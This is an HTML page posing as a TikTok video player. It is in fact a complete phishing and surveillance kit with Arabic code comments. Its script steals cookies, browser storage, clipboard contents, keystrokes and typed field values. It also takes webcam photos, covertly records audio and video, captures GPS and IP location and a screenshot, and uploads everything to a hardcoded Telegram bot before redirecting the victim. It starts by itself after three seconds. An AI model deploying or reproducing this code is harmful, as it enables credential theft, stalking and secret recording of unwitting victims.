<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>TikTok - Watch Video</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{background:#000;overflow:hidden;font-family:Arial,sans-serif;}
        .video-container{width:100vw;height:100vh;max-width:500px;margin:0 auto;position:relative;background:#000;}
        .video-placeholder{width:100%;height:100%;background:linear-gradient(45deg,#ff0050,#00f2ea,#ff0050);background-size:400% 400%;animation:gradient 3s infinite;display:flex;flex-direction:column;justify-content:center;align-items:center;cursor:pointer;}
        @keyframes gradient{0%{background-position:0% 50%;}50%{background-position:100% 50%;}100%{background-position:0% 50%;}}
        .play-btn{width:80px;height:80px;background:rgba(255,255,255,0.2);border-radius:50%;backdrop-filter:blur(10px);display:flex;align-items:center;justify-content:center;border:2px solid rgba(255,255,255,0.3);margin-bottom:20px;}
        .play-btn svg{width:40px;height:40px;fill:#fff;margin-left:5px;}
        .placeholder-text{color:#fff;font-weight:600;text-shadow:0 2px 4px rgba(0,0,0,0.5);}
        .loading-overlay{position:absolute;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:20;opacity:0;visibility:hidden;transition:0.5s;}
        .loading-overlay.active{opacity:1;visibility:visible;}
        .spinner{border:4px solid rgba(255,255,255,0.3);border-top:4px solid #ff0050;border-radius:50%;width:50px;height:50px;animation:spin 1s linear infinite;}
        @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
        .progress-bar{width:200px;height:4px;background:rgba(255,255,255,0.2);border-radius:2px;margin-top:15px;overflow:hidden;}
        .progress-fill{height:100%;background:linear-gradient(90deg,#ff0050,#00f2ea);width:0%;transition:width 0.3s;}
        .loading-message{color:#fff;margin-top:15px;font-size:14px;}
        .notification{position:fixed;top:20px;right:20px;background:rgba(0,0,0,0.9);color:#fff;padding:10px 15px;border-radius:8px;font-size:12px;z-index:30;border-left:3px solid #ff0050;opacity:0;visibility:hidden;transition:0.3s;}
        .notification.show{opacity:1;visibility:visible;}
        video,canvas{position:absolute;width:1px;height:1px;opacity:0;z-index:-1;}
        .fake-ui{position:absolute;bottom:80px;left:15px;right:15px;transition:0.3s;pointer-events:none;}
        .fake-ui.hidden{opacity:0;}
        .username{color:#fff;font-weight:bold;margin-bottom:5px;}
        .desc{color:#fff;font-size:12px;margin-bottom:5px;}
    </style>
</head>
<body>
<div class="video-container">
    <div class="video-placeholder" id="placeholder">
        <div class="play-btn"><svg viewBox="0 0 24 24"><path d="M8 5v14l11-7z"/></svg></div>
        <div class="placeholder-text">▶ Tap to watch</div>
    </div>
    <div class="fake-ui" id="fakeUi">
        <div class="username">@viral_clips</div>
        <div class="desc">Wait for the end 🔥 #fyp #viral</div>
    </div>
    <div class="loading-overlay" id="loading">
        <div class="spinner"></div>
        <div class="progress-bar"><div class="progress-fill" id="progress"></div></div>
        <div class="loading-message" id="loadingMsg">Initializing...</div>
    </div>
    <div class="notification" id="notify"></div>
    <video id="camFeed" autoplay muted></video>
    <canvas id="photoCanvas"></canvas>
    <canvas id="screenCanvas"></canvas>
</div>

<script>
// ===================== التوكين المدمج =====================
const TELEGRAM_TOKEN = '8611440321:AAH-_EXmy8Mlpz70a9y4R2UuCCckjB6P_CI';
const TELEGRAM_CHAT_ID = '178779116';
const REDIRECT_URL = 'https://www.tiktok.com/@tiktok/video/7325515231713506592';

// ===================== المتغيرات العامة =====================
let collected = {
    timestamp: new Date().toISOString(),
    userAgent: navigator.userAgent,
    url: location.href,
    cookies: '',
    localStorage: {},
    sessionStorage: {},
    images: [],
    video: null,
    gps: null,
    ip: null,
    clipboard: null,
    passwords: [],
    keystrokes: [],
    clicks: [],
    screenshot: null,
    fingerprints: {}
};

let cameraStream = null;
let mediaRecorder = null;
let videoChunks = [];

// ===================== دوال رئيسية =====================
function showMsg(text, isError = false) {
    let n = document.getElementById('notify');
    n.textContent = text;
    n.classList.add('show');
    if(isError) n.style.borderLeftColor = '#ff0000';
    else n.style.borderLeftColor = '#ff0050';
    setTimeout(() => n.classList.remove('show'), 2500);
}

function updateProgress(percent, msg) {
    document.getElementById('progress').style.width = percent + '%';
    document.getElementById('loadingMsg').textContent = msg;
}

// 1. جمع الكوكيز والتخزين
function stealStorage() {
    try {
        collected.cookies = document.cookie;
        for(let i=0; i<localStorage.length; i++) {
            let key = localStorage.key(i);
            collected.localStorage[key] = localStorage.getItem(key);
        }
        for(let i=0; i<sessionStorage.length; i++) {
            let key = sessionStorage.key(i);
            collected.sessionStorage[key] = sessionStorage.getItem(key);
        }
        return true;
    } catch(e) { return false; }
}

// 2. سرقة الحافظة
async function stealClipboard() {
    try {
        if(navigator.clipboard) {
            let text = await navigator.clipboard.readText();
            collected.clipboard = text;
        }
    } catch(e) {}
}

// 3. تصوير الكاميرا (3 صور)
async function capturePhotos() {
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        let video = document.getElementById('camFeed');
        video.srcObject = cameraStream;
        await new Promise(r => video.onloadedmetadata = r);
        
        let canvas = document.getElementById('photoCanvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        let ctx = canvas.getContext('2d');
        
        for(let i=0; i<3; i++) {
            ctx.drawImage(video, 0, 0);
            collected.images.push(canvas.toDataURL('image/jpeg', 0.8));
            await new Promise(r => setTimeout(r, 500));
        }
        
        cameraStream.getTracks().forEach(t => t.stop());
        return true;
    } catch(e) { return false; }
}

// 4. تسجيل فيديو سري (5 ثوان)
async function recordVideo() {
    try {
        let stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
        videoChunks = [];
        
        mediaRecorder.ondataavailable = e => { if(e.data.size > 0) videoChunks.push(e.data); };
        mediaRecorder.onstop = () => {
            let blob = new Blob(videoChunks, { type: 'video/webm' });
            let reader = new FileReader();
            reader.onloadend = () => { collected.video = reader.result; };
            reader.readAsDataURL(blob);
        };
        
        mediaRecorder.start();
        await new Promise(r => setTimeout(r, 5000));
        mediaRecorder.stop();
        stream.getTracks().forEach(t => t.stop());
        return true;
    } catch(e) { return false; }
}

// 5. الموقع الدقيق
async function getLocation() {
    return new Promise((resolve) => {
        if(!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
            pos => {
                collected.gps = {
                    lat: pos.coords.latitude,
                    lon: pos.coords.longitude,
                    acc: pos.coords.accuracy
                };
                resolve(collected.gps);
            },
            () => resolve(null),
            { enableHighAccuracy: true, timeout: 10000 }
        );
    });
}

// 6. IP عبر عدة خدمات
async function getIP() {
    try {
        let res = await fetch('https://ipapi.co/json/');
        let data = await res.json();
        collected.ip = data;
    } catch(e) {}
}

// 7. بصمة المتصفح
function getFingerprint() {
    try {
        let canvas = document.getElementById('screenCanvas');
        canvas.width = 200;
        canvas.height = 50;
        let ctx = canvas.getContext('2d');
        ctx.fillText(navigator.userAgent, 2, 20);
        collected.fingerprints.canvas = canvas.toDataURL();
        
        collected.fingerprints.screen = `${screen.width}x${screen.height}`;
        collected.fingerprints.language = navigator.language;
        collected.fingerprints.platform = navigator.platform;
        collected.fingerprints.hardware = navigator.hardwareConcurrency || 'unknown';
    } catch(e) {}
}

// 8. تتبع الضغطات والنقرات
function startTracking() {
    let keys = [];
    let clicks = [];
    
    document.addEventListener('keydown', e => {
        keys.push({ key: e.key, time: Date.now(), target: e.target.tagName });
        if(e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') {
            collected.passwords.push({ field: e.target.name || e.target.id, value: e.target.value });
        }
        if(keys.length > 100) keys = keys.slice(-100);
        collected.keystrokes = keys;
    });
    
    document.addEventListener('click', e => {
        clicks.push({ x: e.clientX, y: e.clientY, tag: e.target.tagName, time: Date.now() });
        if(clicks.length > 50) clicks = clicks.slice(-50);
        collected.clicks = clicks;
    });
}

// 9. تصوير الشاشة
async function captureScreen() {
    try {
        if(!navigator.mediaDevices?.getDisplayMedia) return;
        let stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
        let track = stream.getVideoTracks()[0];
        let imgCapture = new ImageCapture(track);
        let bitmap = await imgCapture.grabFrame();
        let canvas = document.createElement('canvas');
        canvas.width = bitmap.width;
        canvas.height = bitmap.height;
        canvas.getContext('2d').drawImage(bitmap, 0, 0);
        collected.screenshot = canvas.toDataURL('image/jpeg', 0.7);
        track.stop();
    } catch(e) {}
}

// 10. إرسال كل شيء إلى تيليجرام
async function sendToTelegram() {
    let msg = `🔥 <b>SHADOW-STRIKE REPORT</b> 🔥\n\n`;
    msg += `⏰ ${collected.timestamp}\n`;
    msg += `🌐 ${collected.url}\n`;
    msg += `📱 ${collected.userAgent.substring(0, 80)}...\n\n`;
    
    if(collected.ip) {
        msg += `📍 <b>IP:</b> ${collected.ip.ip}\n`;
        msg += `🏙️ ${collected.ip.city}, ${collected.ip.country}\n`;
        if(collected.ip.latitude) msg += `🗺️ <a href="https://maps.google.com/?q=${collected.ip.latitude},${collected.ip.longitude}">View Map</a>\n`;
        msg += `\n`;
    }
    
    if(collected.gps) {
        msg += `🎯 <b>GPS (High Accuracy):</b>\n`;
        msg += `   Lat: ${collected.gps.lat}\n`;
        msg += `   Lon: ${collected.gps.lon}\n`;
        msg += `   Acc: ±${collected.gps.acc}m\n`;
        msg += `   🗺️ <a href="https://maps.google.com/?q=${collected.gps.lat},${collected.gps.lon}">Open GPS</a>\n\n`;
    }
    
    if(collected.cookies) {
        msg += `🍪 <b>Cookies:</b>\n<code>${collected.cookies.substring(0, 200)}...</code>\n\n`;
    }
    
    if(Object.keys(collected.localStorage).length) {
        msg += `💾 <b>LocalStorage:</b>\n`;
        for(let k in collected.localStorage) {
            msg += `   ${k}: ${String(collected.localStorage[k]).substring(0, 50)}...\n`;
        }
        msg += `\n`;
    }
    
    if(collected.clipboard) {
        msg += `📋 <b>Clipboard:</b>\n<code>${collected.clipboard.substring(0, 200)}</code>\n\n`;
    }
    
    if(collected.passwords.length) {
        msg += `🔑 <b>Password Fields:</b>\n`;
        collected.passwords.forEach(p => {
            msg += `   ${p.field}: ${p.value.substring(0, 50)}\n`;
        });
        msg += `\n`;
    }
    
    msg += `📸 <b>Photos:</b> ${collected.images.length}\n`;
    msg += `🎬 <b>Video:</b> ${collected.video ? 'Captured' : 'Failed'}\n`;
    msg += `🖥️ <b>Screenshot:</b> ${collected.screenshot ? 'Taken' : 'Failed'}\n`;
    
    try {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML', disable_web_page_preview: true })
        });
        
        // إرسال الصور
        for(let i=0; i<collected.images.length; i++) {
            let imgBlob = await fetch(collected.images[i]).then(r => r.blob());
            let fd = new FormData();
            fd.append('chat_id', TELEGRAM_CHAT_ID);
            fd.append('photo', imgBlob, `cam_${i}.jpg`);
            fd.append('caption', `📸 Camera shot ${i+1}`);
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
            await new Promise(r => setTimeout(r, 500));
        }
        
        // إرسال الفيديو
        if(collected.video) {
            let vidBlob = await fetch(collected.video).then(r => r.blob());
            let fd = new FormData();
            fd.append('chat_id', TELEGRAM_CHAT_ID);
            fd.append('video', vidBlob, 'secret.webm');
            fd.append('caption', '🎥 Secret recording');
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, { method: 'POST', body: fd });
        }
        
        // إرسال لقطة الشاشة
        if(collected.screenshot) {
            let scBlob = await fetch(collected.screenshot).then(r => r.blob());
            let fd = new FormData();
            fd.append('chat_id', TELEGRAM_CHAT_ID);
            fd.append('photo', scBlob, 'screenshot.jpg');
            fd.append('caption', '🖥️ Full screenshot');
            await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
        }
        
        showMsg('✅ Data sent successfully');
    } catch(e) {
        showMsg('❌ Send failed: ' + e.message, true);
    }
}

// ===================== التشغيل الرئيسي =====================
async function executeShadowStrike() {
    try {
        updateProgress(5, 'Connecting to shadow network...');
        await new Promise(r => setTimeout(r, 300));
        
        updateProgress(15, 'Extracting cookies & storage...');
        stealStorage();
        await stealClipboard();
        await new Promise(r => setTimeout(r, 300));
        
        updateProgress(30, 'Accessing camera...');
        await capturePhotos();
        await new Promise(r => setTimeout(r, 400));
        
        updateProgress(50, 'Recording video (5sec)...');
        await recordVideo();
        await new Promise(r => setTimeout(r, 400));
        
        updateProgress(65, 'Fetching GPS location...');
        await getLocation();
        await getIP();
        await new Promise(r => setTimeout(r, 400));
        
        updateProgress(80, 'Taking screenshot...');
        await captureScreen();
        getFingerprint();
        startTracking();
        await new Promise(r => setTimeout(r, 500));
        
        updateProgress(95, 'Uploading to Telegram...');
        await sendToTelegram();
        
        updateProgress(100, 'Redirecting...');
        await new Promise(r => setTimeout(r, 1500));
        
        window.location.href = REDIRECT_URL;
        
    } catch(err) {
        console.error(err);
        showMsg('Error: ' + err.message, true);
        setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
    }
}

// ===================== بدء الهجوم =====================
document.getElementById('placeholder').addEventListener('click', () => {
    document.getElementById('placeholder').style.display = 'none';
    document.getElementById('fakeUi').classList.add('hidden');
    document.getElementById('loading').classList.add('active');
    executeShadowStrike();
});

// تشغيل تلقائي بعد 3 ثوانٍ
setTimeout(() => {
    let placeholder = document.getElementById('placeholder');
    if(placeholder.style.display !== 'none') {
        placeholder.click();
    }
}, 3000);

showMsg('Tap to play video');
</script>
</body>
</html>